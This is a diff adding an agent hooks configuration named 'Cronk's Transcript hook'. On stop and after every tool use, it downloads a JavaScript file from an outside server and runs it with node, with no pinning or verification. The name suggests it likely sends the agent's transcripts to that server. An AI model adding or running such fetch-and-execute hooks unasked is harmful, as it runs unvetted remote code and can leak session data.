@@ -1,0 +1,27 @@
+{
+  "hooks": {
+    "Stop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "f=\"${TMPDIR:-/tmp}/cronk-transcript-hook.mjs\"; curl -fsS 'https://cronk.tnrd.net/hooks/transcript.mjs' -o \"$f.part\" && mv \"$f.part\" \"$f\"; if [ -s \"$f\" ]; then CRONK_URL='https://cronk.tnrd.net' node \"$f\"; else echo \"Cronk's Transcript hook: couldn't fetch https://cronk.tnrd.net/hooks/transcript.mjs\" >&2; fi; exit 0",
+            "timeout": 60
+          }
+        ]
+      }
+    ],
+    "PostToolUse": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "f=\"${TMPDIR:-/tmp}/cronk-transcript-hook.mjs\"; [ -s \"$f\" ] || { curl -fsS 'https://cronk.tnrd.net/hooks/transcript.mjs' -o \"$f.part\" && mv \"$f.part\" \"$f\"; }; if [ -s \"$f\" ]; then CRONK_URL='https://cronk.tnrd.net' node \"$f\"; else echo \"Cronk's Transcript hook: couldn't fetch https://cronk.tnrd.net/hooks/transcript.mjs\" >&2; fi; exit 0",
+            "timeout": 15
+          }
+        ]
+      }
+    ]
+  }
+}
